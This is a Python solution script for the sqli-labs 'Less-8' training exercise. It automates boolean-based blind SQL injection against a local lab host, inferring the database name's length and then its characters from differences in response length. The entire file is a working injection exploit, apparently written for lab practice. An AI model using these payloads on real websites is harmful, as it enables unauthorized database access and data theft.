#! python3
## sqli-lab Less-8

import requests 
import string
import time

def dbname_len(url , normalHtmlLen):
    # 判断库名长度
    dbNameLen = 0 
    while True:
        dbNameLen_url = url + "?id=1'+and+length(database())=" + str(dbNameLen) + "--+"
        print("The url of dbNameLen:%s"%(dbNameLen_url))

        if len(requests.get(dbNameLen_url).text) == normalHtmlLen :
            # print("The len of dbName:%s"%(str(dbNameLen)))
            return dbNameLen
        if dbNameLen >= 20 :
            print("Error")
            break

        dbNameLen += 1
    return 

def dbname(url , normalHtmlLen , dbNamelen):
    # 判断库名
    dbName = ""  
    for i in range(1,int(dbNamelen+1)):
        for key in string.ascii_lowercase :
            dbName_url = url + "?id=1'+and+substr(database(),%d,1)='%s'--+"%(i,key)
            print(dbName_url)
            if len(requests.get(dbName_url).text) == normalHtmlLen :
                dbName += key
                print("DB_NAME--" + dbName)
                break
            
    return dbName

def main():
    url = "http://sqli.lab:1088/Less-8/"
    start_time = time.time()
    normalHtmlLen = len(requests.get(url = url + "?id=1").text)
    print("The len of HTML:%d"%(normalHtmlLen))

    dbNameLen = dbname_len(url , normalHtmlLen)
    dbName = dbname(url , normalHtmlLen , dbNameLen)

    print("数据库名长度为:%d"%(dbNameLen))
    print("数据库库名为:%s"%(dbName))

    end_time = time.time()

    print("本次运行共计用时:[%d]秒"%(end_time-start_time))
    

if __name__ == "__main__":
    main()